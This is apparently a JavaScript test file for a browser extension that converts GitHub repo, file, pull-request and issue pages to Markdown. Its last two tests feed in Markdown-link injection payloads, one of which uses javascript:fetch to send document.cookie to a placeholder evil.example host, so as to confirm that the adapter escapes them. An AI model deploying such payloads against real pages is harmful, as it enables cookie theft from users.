// GitHub adapter (CLIP-10).
//
// One host, three documents. A repo page is its README plus a few facts; a
// blob page is source code and its path; a PR is a conversation. Saving any
// of them generically gives you the file tree and the nav.

import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";
import { loadExtensionScripts } from "../test_helpers.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));
const fixture = (name) => readFileSync(join(HERE, "fixtures", name), "utf8");

const g = loadExtensionScripts([
  "domlite.js",
  "markdown.js",
  "adapters/util.js",
  "adapters/registry.js",
  "adapters/github.js",
]);

const run = (url, html) =>
  g.MonoAdapters.run({ url, tree: g.MonoDomLite.parse(html), baseUrl: url, title: "t" });

const REPO = "https://github.com/monoes/mono-agent";
const BLOB = "https://github.com/monoes/mono-agent/blob/master/internal/capture/envelope.go";
const PR = "https://github.com/monoes/mono-agent/pull/96";

test("it claims repo, blob, PR and issue paths but not the site chrome", () => {
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "github");
  const bare = g.MonoDomLite.parse("<html><body></body></html>");
  const claims = (url) => ad.match({ url, tree: bare });

  assert.ok(claims(REPO));
  assert.ok(claims(BLOB));
  assert.ok(claims(PR));
  assert.ok(claims("https://github.com/monoes/mono-agent/issues/12"));
  assert.ok(claims("https://github.com/monoes/mono-agent/tree/master/internal"));
  assert.equal(claims("https://github.com/"), false);
  assert.equal(claims("https://github.com/monoes"), false, "an owner page is not a repo");
  assert.equal(claims("https://github.com/settings/profile"), false, "reserved paths are not repos");
  assert.equal(claims("https://gist.github.com/adarenn/abc"), false);
  assert.equal(claims("https://notgithub.test/a/b"), false);
});

test("a repo page is the README plus name, description, stars and language", () => {
  const out = run(REPO, fixture("github_repo.html"));

  assert.equal(out.adapter, "github");
  assert.equal(out.title, "monoes/mono-agent");
  assert.match(out.markdown, /^# monoes\/mono-agent/);
  assert.match(out.markdown, /Local-first workflow automation in one Go binary\./);
  assert.match(out.markdown, /\*\*Stars:\*\* 4,182/, "the exact count from the title attribute, not the rounded label");
  assert.match(out.markdown, /\*\*Language:\*\* Go/);

  // The README is the document, and its structure has to survive intact.
  assert.match(out.markdown, /## README/);
  assert.match(out.markdown, /```bash\ngo install github\.com\/monoes\/mono-agent\/cmd\/monoagentcli@latest\n```/);
  assert.match(out.markdown, /- Your credentials never leave the machine\./);

  assert.equal(out.meta.kind, "repo");
  assert.equal(out.meta.repo, "monoes/mono-agent");
  assert.equal(out.meta.stars, 4182);
  assert.equal(out.meta.language, "Go");
});

test("a repo with no README is still worth its facts, with a warning", () => {
  const html = fixture("github_repo.html").replace(/<div id="readme"[\s\S]*?<\/div>\s*<\/div>/, "");
  const out = run(REPO, html);

  assert.match(out.markdown, /# monoes\/mono-agent/);
  assert.match(out.markdown, /\*\*Stars:\*\* 4,182/);
  assert.ok(out.warnings.some((w) => /readme/i.test(w)));
});

test("a blob page is the source in a fenced block, with its path", () => {
  const out = run(BLOB, fixture("github_blob.html"));

  assert.equal(out.meta.kind, "file");
  assert.equal(out.meta.path, "internal/capture/envelope.go");
  assert.equal(out.title, "monoes/mono-agent — internal/capture/envelope.go");
  assert.match(out.markdown, /^# internal\/capture\/envelope\.go/);
  // The fence language comes from the extension, so the code is readable.
  assert.match(out.markdown, /```go\npackage capture\n/);
  assert.match(out.markdown, /func ValidArtifactName\(name string\) bool \{/);
  assert.match(out.markdown, /\n```$/);
  assert.equal(out.meta.language, "Go");
});

test("the legacy per-line blob view reassembles into the same shape", () => {
  const out = run(
    "https://github.com/monoes/mono-agent/blob/master/chrome-extension/domlite.js",
    fixture("github_blob_legacy.html")
  );

  assert.equal(out.meta.kind, "file");
  assert.match(out.markdown, /```javascript\nconst VOID = new Set\(\[\n  "area", "br", "img",\n\]\);\n```/);
});

test("indentation inside a fenced block is not eaten by Markdown escaping", () => {
  const out = run(BLOB, fixture("github_blob.html"));
  assert.match(out.markdown, /\n\tif name == "" \{\n/, "a literal tab, not an escaped one");
  assert.doesNotMatch(out.markdown, /\\"/);
});

test("a PR is title, state, body and the discussion in order", () => {
  const out = run(PR, fixture("github_pr.html"));

  assert.equal(out.meta.kind, "pull");
  assert.equal(out.meta.number, 96);
  assert.equal(out.meta.state, "Merged");
  assert.equal(out.title, "monoes/mono-agent#96: fix(capture): keep blank lines out of the readable artifact");
  assert.match(out.markdown, /^# fix\(capture\): keep blank lines out of the readable artifact/);
  assert.match(out.markdown, /\*\*State:\*\* Merged/);

  assert.match(out.markdown, /## adarenn — 2024-03-03T10:11:00Z/);
  assert.match(out.markdown, /The Markdown renderer was collapsing every run of blank lines/);
  assert.match(out.markdown, /```bash\nmonoagentcli capture --url https:\/\/example\.test\/quote\n```/);

  const order = ["was collapsing every run", "Does this also cover", "there is a test for it now"];
  const at = order.map((s) => out.markdown.indexOf(s));
  assert.ok(at.every((i) => i >= 0), `all three comments present: ${JSON.stringify(at)}`);
  assert.deepEqual(at, [...at].sort((a, b) => a - b), "comments stay in posted order");

  assert.equal(out.meta.commentCount, 3);
});

test("an issue is the same shape with a different kind", () => {
  const html = fixture("github_pr.html")
    .replace("State--merged", "State--open")
    .replace("> Merged", "> Open");
  const out = run("https://github.com/monoes/mono-agent/issues/96", html);

  assert.equal(out.meta.kind, "issue");
  assert.equal(out.meta.state, "Open");
});

test("a GitHub redesign that removes every hook falls back rather than emitting a shell", () => {
  const out = run(REPO, "<html><head><title>GitHub</title></head><body><nav>Sign in</nav></body></html>");
  assert.equal(out, null);
  assert.ok(g.MonoAdapters.lastWarnings().some((w) => /github declined/.test(w)));
});

test("a rounded star label is never read as an exact count", () => {
  // "4.2k" used to have its non-digits stripped and land in meta as 42 — off
  // by two orders of magnitude, and indistinguishable from a real count.
  const cases = [
    ["4.2k", 4200],
    ["12k", 12000],
    ["1.3m", 1300000],
    ["4,182", 4182],
    ["4182", 4182],
  ];
  for (const [label, expected] of cases) {
    const html = fixture("github_repo.html").replace('title="4,182"', `title="${label}"`);
    const out = run(REPO, html);
    assert.equal(out.meta.stars, expected, `${label} should read as ${expected}`);
    assert.match(out.markdown, new RegExp(`\\*\\*Stars:\\*\\* ${label.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`));
  }
});

test("a star label that parses as nothing is recorded as nothing, not as a number", () => {
  const html = fixture("github_repo.html").replace('title="4,182"', 'title="many"');
  const out = run(REPO, html);
  assert.equal(out.meta.stars, null, "an unparseable label must not invent a count");
});

test("a malformed percent escape in a repo path does not take match() down", () => {
  const [ad] = g.MonoAdapters.all().filter((a) => a.name === "github");
  const bare = g.MonoDomLite.parse("<html><body></body></html>");
  // route() runs on every page the extension captures, via match().
  for (const url of [
    "https://github.com/%ZZ/repo",
    "https://github.com/monoes/%E0%A4%A",
    "https://github.com/monoes/mono-agent/blob/master/a%ZZb.go",
    "https://example.test/%ZZ",
  ]) {
    assert.doesNotThrow(() => ad.match({ url, tree: bare }), url);
  }
});

test("a file made of backtick runs does not overflow the argument stack", () => {
  // Math.max(...array) throws RangeError past ~125k arguments, and a blob
  // page is user-supplied bytes.
  const source = "`".repeat(200000);
  const html = `<html><body><textarea data-testid="read-only-cursor-text-area">${source}</textarea></body></html>`;
  let out;
  assert.doesNotThrow(() => {
    out = run(BLOB, html);
  });
  assert.equal(out.meta.kind, "file");
  assert.match(out.markdown, /^`{200001}go$/m, "the fence is longer than the longest run inside it");
});

test("markdown syntax smuggled through the URL cannot forge a link", () => {
  // owner/repo/path come out of the URL and are percent-decoded, so they can
  // carry any character at all.
  const url =
    "https://github.com/monoes/mono-agent/blob/master/a%5D%28javascript%3Afetch%28%27%2F%2Fevil.example%27%29%29.go";
  const out = run(url, fixture("github_blob.html"));

  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
});

test("a comment author cannot smuggle a link into its own heading", () => {
  const html = fixture("github_pr.html").replaceAll(
    ">adarenn<",
    ">adarenn](javascript:fetch('//evil.example/'+document.cookie))<"
  );
  const out = run(PR, html);
  assert.doesNotMatch(out.markdown, /(?<!\\)\]\(javascript:/i);
});
